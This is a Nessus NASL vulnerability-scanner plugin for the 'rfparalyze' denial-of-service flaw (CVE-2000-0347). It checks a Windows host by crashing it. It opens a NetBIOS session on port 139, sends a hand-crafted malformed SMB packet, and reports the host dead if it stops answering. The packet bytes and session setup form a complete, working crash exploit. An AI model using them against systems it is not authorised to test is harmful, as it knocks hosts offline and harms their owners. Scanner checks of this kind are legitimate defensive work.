
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# It's based on the 'rfparalyze' exploit
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10392);
 script_bugtraq_id(1163);
script_cve_id("CVE-2000-0347");
 script_version ("$Revision: 1.15 $");
 name["english"] = "rfparalyze";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the remote host
using the 'rfparalyze' denial of service attack.

Solution : contact Microsoft for a patch. Meanwhile,
filter incoming tcp connections to this port
Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de faire planter le système
distant en utilisant l'attaque 'rfparalyze'

Solution : contactez Microsoft pour un patch. En attendant,
filtrez les connections entrantes vers ce port
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crash a host through winpopups";
 script_summary(english:summary["english"]);
 
 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison. Orignal code RFP");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("netbios_name_get.nasl");
 script_require_keys("SMB/name");
 script_require_ports(139);
 exit(0);
}



function PadName(orig)
{
 ret = "";
 if ( isnull(orig) ) return;
 len = strlen(orig);
 for(i=0;i<15;i=i+1)
 {
   if(i >= len)
   {
     c = "CA";
   }
   else
   {
     o = ord(orig[i]);
     odiv = o/16;
     odiv = odiv + ord("A");
     omod = o%16;
     omod = omod + ord("A");
     c = raw_string(odiv, omod);
   }
 ret = ret+c;
 }
 ret = ret + "AD";
 return(ret); 
}

function nessus_wins()
{
 security_hole(139); 
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}	


name = string(get_kb_item("SMB/name"));
if(!name)exit(0);


blowup = raw_string(0x00, 0x00, 0x00, 0x41,0xff, 0x53, 0x4d,
	 	    0x42,0xd0,0x00,0x00,0x00,0x00,0x00,0x00,
		    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		    0x00,0x00,0x00,0x00,0x00,0x19,0x00,0x04,
		    0x42,0x45,0x41,0x56,0x00,0x04,0x42,0x45,
		    0x41,0x56,0x49,0x53,0x00,0x01,0x08,0x00,
		    0x79,0x65,0x70,0x20,0x79,0x65,0x70,0x00,
		    0x00);



myname = PadName(orig:"WICCA");
yourname = PadName(orig:name);

req = raw_string(0x81, 0x00, 0x00, 0x44, 0x20) + yourname;
req = req +  raw_string(0x00, 0x20);
req = req + myname + raw_string(0x00);

if(!get_port_state(139))exit(0);      
soc = open_sock_tcp(139);


if(soc)
{
send(socket:soc, data:req, length:72);
r = recv(socket:soc, length:4000);
if ( r == NULL || strlen(r) == 0 ) exit(0);
if(ord(r[0])==0x82)
{
 send(socket:soc, data:blowup, length:72);
 r = recv(socket:soc, length:4000);
 close(soc);

 sleep(5);
 soc = open_sock_tcp(139);
 if(!soc)nessus_wins();
 
 send(socket:soc, data:req, length:72);
 r = recv(socket:soc, length:4000);
 close(soc);
 if(!r)nessus_wins();
 if(!(ord(r[0]) == 0x82))nessus_wins();
 }
}
